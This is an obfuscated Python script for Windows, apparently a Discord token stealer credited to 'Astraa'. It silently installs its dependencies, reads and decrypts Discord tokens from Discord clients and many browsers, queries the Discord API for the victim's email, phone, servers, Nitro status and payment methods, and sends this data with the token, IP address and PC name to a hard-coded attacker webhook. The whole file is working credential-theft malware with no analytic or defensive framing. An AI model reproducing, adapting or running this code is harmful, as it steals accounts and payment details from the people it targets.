import os #line:1
if os .name !="nt":#line:2
    exit ()#line:3
import subprocess #line:4
import sys #line:5
import json #line:6
import urllib .request #line:7
import re #line:8
import base64 #line:9
import datetime #line:10
def install_import (O00O000OO0000O000 ):#line:12
    for O0O000OO0OO0OOOOO ,O0O0OOOO0O0000OOO in O00O000OO0000O000 :#line:13
        try :#line:14
            __import__ (O0O000OO0OO0OOOOO )#line:15
        except ImportError :#line:16
            subprocess .check_call ([sys .executable ,"-m","pip","install",O0O0OOOO0O0000OOO ],stdout =subprocess .DEVNULL ,stderr =subprocess .DEVNULL )#line:17
            os .execl (sys .executable ,sys .executable ,*sys .argv )#line:18
install_import ([("win32crypt","pypiwin32"),("Crypto.Cipher","pycryptodome")])#line:20
import win32crypt #line:22
from Crypto .Cipher import AES #line:23
LOCAL =os .getenv ("LOCALAPPDATA")#line:25
ROAMING =os .getenv ("APPDATA")#line:26
PATHS ={'Discord':ROAMING +'\\discord','Discord Canary':ROAMING +'\\discordcanary','Lightcord':ROAMING +'\\Lightcord','Discord PTB':ROAMING +'\\discordptb','Opera':ROAMING +'\\Opera Software\\Opera Stable','Opera GX':ROAMING +'\\Opera Software\\Opera GX Stable','Amigo':LOCAL +'\\Amigo\\User Data','Torch':LOCAL +'\\Torch\\User Data','Kometa':LOCAL +'\\Kometa\\User Data','Orbitum':LOCAL +'\\Orbitum\\User Data','CentBrowser':LOCAL +'\\CentBrowser\\User Data','7Star':LOCAL +'\\7Star\\7Star\\User Data','Sputnik':LOCAL +'\\Sputnik\\Sputnik\\User Data','Vivaldi':LOCAL +'\\Vivaldi\\User Data\\Default','Chrome SxS':LOCAL +'\\Google\\Chrome SxS\\User Data','Chrome':LOCAL +"\\Google\\Chrome\\User Data"+'Default','Epic Privacy Browser':LOCAL +'\\Epic Privacy Browser\\User Data','Microsoft Edge':LOCAL +'\\Microsoft\\Edge\\User Data\\Defaul','Uran':LOCAL +'\\uCozMedia\\Uran\\User Data\\Default','Yandex':LOCAL +'\\Yandex\\YandexBrowser\\User Data\\Default','Brave':LOCAL +'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Iridium':LOCAL +'\\Iridium\\User Data\\Default'}#line:50
def getheaders (token =None ):#line:52
    OO000OOOO0OOOO000 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"}#line:56
    if token :#line:58
        OO000OOOO0OOOO000 .update ({"Authorization":token })#line:59
    return OO000OOOO0OOOO000 #line:61
def gettokens (O0O0O00OOO00O0OO0 ):#line:63
    O0O0O00OOO00O0OO0 +="\\Local Storage\\leveldb\\"#line:64
    O00OO00000O00000O =[]#line:65
    if not os .path .exists (O0O0O00OOO00O0OO0 ):#line:67
        return O00OO00000O00000O #line:68
    for O0O0000O0O0OO0000 in os .listdir (O0O0O00OOO00O0OO0 ):#line:70
        if not O0O0000O0O0OO0000 .endswith (".ldb")and O0O0000O0O0OO0000 .endswith (".log"):#line:71
            continue #line:72
        try :#line:74
            with open (f"{O0O0O00OOO00O0OO0}{O0O0000O0O0OO0000}","r",errors ="ignore")as OOOOO0000OOO0O0O0 :#line:75
                for O0OOOO0OOO00O0O00 in (OOOO0OOOO0O0O0OOO .strip ()for OOOO0OOOO0O0O0OOO in OOOOO0000OOO0O0O0 .readlines ()):#line:76
                    for OOO000O0OO00OOOOO in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",O0OOOO0OOO00O0O00 ):#line:77
                        O00OO00000O00000O .append (OOO000O0OO00OOOOO )#line:78
        except PermissionError :#line:79
            continue #line:80
    return O00OO00000O00000O #line:82
def getkey (OOOOOO0O0OO00OOO0 ):#line:84
    with open (OOOOOO0O0OO00OOO0 +f"\\Local State","r")as O00O0OO0O0000OOO0 :#line:85
        OO0000O0O0000OO0O =json .loads (O00O0OO0O0000OOO0 .read ())['os_crypt']['encrypted_key']#line:86
        O00O0OO0O0000OOO0 .close ()#line:87
    return OO0000O0O0000OO0O #line:89
def getip ():#line:91
    try :#line:92
        with urllib .request .urlopen ("https://api.ipify.org?format=json")as O0OO000OO0OOOO000 :#line:93
            return json .loads (O0OO000OO0OOOO000 .read ().decode ()).get ("ip")#line:94
    except :#line:95
        return "None"#line:96
def main ():#line:98
    OO0O000O0000OO0O0 =[]#line:99
    for OO00OOO0OOOO00000 ,O0000OOOOO00O0OOO in PATHS .items ():#line:101
        if not os .path .exists (O0000OOOOO00O0OOO ):#line:102
            continue #line:103
        for OO0O0000O000O00O0 in gettokens (O0000OOOOO00O0OOO ):#line:105
            OO0O0000O000O00O0 =OO0O0000O000O00O0 .replace ("\\","")if OO0O0000O000O00O0 .endswith ("\\")else OO0O0000O000O00O0 #line:106
            try :#line:108
                OO0O0000O000O00O0 =AES .new (win32crypt .CryptUnprotectData (base64 .b64decode (getkey (O0000OOOOO00O0OOO ))[5 :],None ,None ,None ,0 )[1 ],AES .MODE_GCM ,base64 .b64decode (OO0O0000O000O00O0 .split ('dQw4w9WgXcQ:')[1 ])[3 :15 ]).decrypt (base64 .b64decode (OO0O0000O000O00O0 .split ('dQw4w9WgXcQ:')[1 ])[15 :])[:-16 ].decode ()#line:109
                if OO0O0000O000O00O0 in OO0O000O0000OO0O0 :#line:110
                    continue #line:111
                OO0O000O0000OO0O0 .append (OO0O0000O000O00O0 )#line:112
                O00000000OOOO0OO0 =urllib .request .urlopen (urllib .request .Request ('https://discord.com/api/v10/users/@me',headers =getheaders (OO0O0000O000O00O0 )))#line:114
                if O00000000OOOO0OO0 .getcode ()!=200 :#line:115
                    continue #line:116
                O000OO0OOOOOO00O0 =json .loads (O00000000OOOO0OO0 .read ().decode ())#line:117
                OO0000OOO000OOO00 =""#line:119
                OOO00OO0O0000O0O0 =O000OO0OOOOOO00O0 ['flags']#line:120
                if OOO00OO0O0000O0O0 ==64 or OOO00OO0O0000O0O0 ==96 :#line:121
                    OO0000OOO000OOO00 +=":BadgeBravery: "#line:122
                if OOO00OO0O0000O0O0 ==128 or OOO00OO0O0000O0O0 ==160 :#line:123
                    OO0000OOO000OOO00 +=":BadgeBrilliance: "#line:124
                if OOO00OO0O0000O0O0 ==256 or OOO00OO0O0000O0O0 ==288 :#line:125
                    OO0000OOO000OOO00 +=":BadgeBalance: "#line:126
                OO0000O0OO0O00OOO =urllib .parse .urlencode ({"with_counts":True })#line:128
                O00000000OOOO0OO0 =json .loads (urllib .request .urlopen (urllib .request .Request (f'https://discordapp.com/api/v6/users/@me/guilds?{OO0000O0OO0O00OOO}',headers =getheaders (OO0O0000O000O00O0 ))).read ().decode ())#line:129
                OOOOO0OOO00O0OO00 =len (O00000000OOOO0OO0 )#line:130
                O0O0OO000OO0OOO0O =""#line:131
                for O0OO0O00O0OOOOOO0 in O00000000OOOO0OO0 :#line:133
                    if O0OO0O00O0OOOOOO0 ['permissions']&8 or O0OO0O00O0OOOOOO0 ['permissions']&32 :#line:134
                        O00000000OOOO0OO0 =json .loads (urllib .request .urlopen (urllib .request .Request (f'https://discordapp.com/api/v6/guilds/{O0OO0O00O0OOOOOO0["id"]}',headers =getheaders (OO0O0000O000O00O0 ))).read ().decode ())#line:135
                        OOO00OO0000OOO0O0 =""#line:136
                        if O00000000OOOO0OO0 ["vanity_url_code"]!=None :#line:138
                            OOO00OO0000OOO0O0 =f"""; .gg/{O00000000OOOO0OO0["vanity_url_code"]}"""#line:139
                        O0O0OO000OO0OOO0O +=f"""\nㅤ- [{O0OO0O00O0OOOOOO0['name']}]: {O0OO0O00O0OOOOOO0['approximate_member_count']}{OOO00OO0000OOO0O0}"""#line:141
                if O0O0OO000OO0OOO0O =="":#line:142
                    O0O0OO000OO0OOO0O ="No guilds"#line:143
                O00000000OOOO0OO0 =json .loads (urllib .request .urlopen (urllib .request .Request ('https://discordapp.com/api/v6/users/@me/billing/subscriptions',headers =getheaders (OO0O0000O000O00O0 ))).read ().decode ())#line:145
                O00OOO0O0O0000OOO =False #line:146
                O00OOO0O0O0000OOO =bool (len (O00000000OOOO0OO0 )>0 )#line:147
                O0000000OOO0OOO00 =None #line:148
                if O00OOO0O0O0000OOO :#line:149
                    OO0000OOO000OOO00 +=f":BadgeSubscriber: "#line:150
                    O0000000OOO0OOO00 =datetime .datetime .strptime (O00000000OOOO0OO0 [0 ]["current_period_end"],"%Y-%m-%dT%H:%M:%S.%f%z").strftime ('%d/%m/%Y at %H:%M:%S')#line:151
                O00000000OOOO0OO0 =json .loads (urllib .request .urlopen (urllib .request .Request ('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',headers =getheaders (OO0O0000O000O00O0 ))).read ().decode ())#line:153
                OOO0OOOO0O000O00O =0 #line:154
                OOO0000OO0OO0O00O =""#line:155
                O0O0O0O00O00O0O00 =False #line:156
                for OO0O00O00OOO000OO in O00000000OOOO0OO0 :#line:157
                    O00OO00O0OOOOOO00 =datetime .datetime .strptime (OO0O00O00OOO000OO ["cooldown_ends_at"],"%Y-%m-%dT%H:%M:%S.%f%z")#line:158
                    if O00OO00O0OOOOOO00 -datetime .datetime .now (datetime .timezone .utc )<datetime .timedelta (seconds =0 ):#line:159
                        OOO0000OO0OO0O00O +=f"ㅤ- Available now\n"#line:160
                        OOO0OOOO0O000O00O +=1 #line:161
                    else :#line:162
                        OOO0000OO0OO0O00O +=f"ㅤ- Available on {O00OO00O0OOOOOO00.strftime('%d/%m/%Y at %H:%M:%S')}\n"#line:163
                    O0O0O0O00O00O0O00 =True #line:164
                if O0O0O0O00O00O0O00 :#line:165
                    OO0000OOO000OOO00 +=f":BadgeBoost: "#line:166
                O000O0OO00OOO0O00 =0 #line:168
                OOO0000O00OOOOO0O =""#line:169
                OOO000OO00O0000O0 =0 #line:170
                for O00O0OOOOO0O000OO in json .loads (urllib .request .urlopen (urllib .request .Request ('https://discordapp.com/api/v6/users/@me/billing/payment-sources',headers =getheaders (OO0O0000O000O00O0 ))).read ().decode ()):#line:171
                    if O00O0OOOOO0O000OO ['type']==1 :#line:172
                        OOO0000O00OOOOO0O +="CreditCard "#line:173
                        if not O00O0OOOOO0O000OO ['invalid']:#line:174
                            OOO000OO00O0000O0 +=1 #line:175
                        O000O0OO00OOO0O00 +=1 #line:176
                    elif O00O0OOOOO0O000OO ['type']==2 :#line:177
                        OOO0000O00OOOOO0O +="PayPal "#line:178
                        if not O00O0OOOOO0O000OO ['invalid']:#line:179
                            OOO000OO00O0000O0 +=1 #line:180
                        O000O0OO00OOO0O00 +=1 #line:181
                OOOOO0O0O000OO00O =f"\nNitro Informations:\n```yaml\nHas Nitro: {O00OOO0O0O0000OOO}\nExpiration Date: {O0000000OOO0OOO00}\nBoosts Available: {OOO0OOOO0O000O00O}\n{OOO0000OO0OO0O00O if O0O0O0O00O00O0O00 else ''}\n```"#line:183
                OO0OOOOO00O000O00 =f"\nNitro Informations:\n```yaml\nBoosts Available: {OOO0OOOO0O000O00O}\n{OOO0000OO0OO0O00O if O0O0O0O00O00O0O00 else ''}\n```"#line:184
                O00000OO0O00OO00O =f"\nPayment Methods:\n```yaml\nAmount: {O000O0OO00OOO0O00}\nValid Methods: {OOO000OO00O0000O0} method(s)\nType: {OOO0000O00OOOOO0O}\n```"#line:185
                OOO000OO0O00O0O00 ={'embeds':[{'title':f"**New user data: {O000OO0OOOOOO00O0['username']}**",'description':f"""
                                ```yaml\nUser ID: {O000OO0OOOOOO00O0['id']}\nEmail: {O000OO0OOOOOO00O0['email']}\nPhone Number: {O000OO0OOOOOO00O0['phone']}\n\nGuilds: {OOOOO0OOO00O0OO00}\nAdmin Permissions: {O0O0OO000OO0OOO0O}\n``` ```yaml\nMFA Enabled: {O000OO0OOOOOO00O0['mfa_enabled']}\nFlags: {OOO00OO0O0000O0O0}\nLocale: {O000OO0OOOOOO00O0['locale']}\nVerified: {O000OO0OOOOOO00O0['verified']}\n```{OOOOO0O0O000OO00O if O00OOO0O0O0000OOO else OO0OOOOO00O000O00 if OOO0OOOO0O000O00O > 0 else ""}{O00000OO0O00OO00O if O000O0OO00OOO0O00 > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {OO00OOO0OOOO00000}\n```Token: \n```yaml\n{OO0O0000O000O00O0}```""",'color':3092790 ,'footer':{'text':"Made by Astraa ・ https://github.com/astraadev"},'thumbnail':{'url':f"https://cdn.discordapp.com/avatars/{O000OO0OOOOOO00O0['id']}/{O000OO0OOOOOO00O0['avatar']}.png"}}],"username":"vollkov","avatar_url":"https://cdn.discordapp.com/avatars/703302319416148008/90f11f62f43b602ed9eb211cb9309298.webp?size=1024"}#line:203
                urllib .request .urlopen (urllib .request .Request ('https://discord.com/api/webhooks/1383604819108958278/DkkRRpeDQBAOrQuAYqU2cFlOaj0M5l_phURpgktZAw8yprI6rBOGEVTmdnHnWJ22K7SC',data =json .dumps (OOO000OO0O00O0O00 ).encode ('utf-8'),headers =getheaders (),method ='POST')).read ().decode ()#line:205
            except urllib .error .HTTPError or json .JSONDecodeError :#line:206
                continue #line:207
            except Exception as OO0OO0O0OOOO0O0OO :#line:208
                print (f"ERROR: {OO0OO0O0OOOO0O0OO}")#line:209
                continue #line:210
if __name__ =="__main__":#line:212
    main ()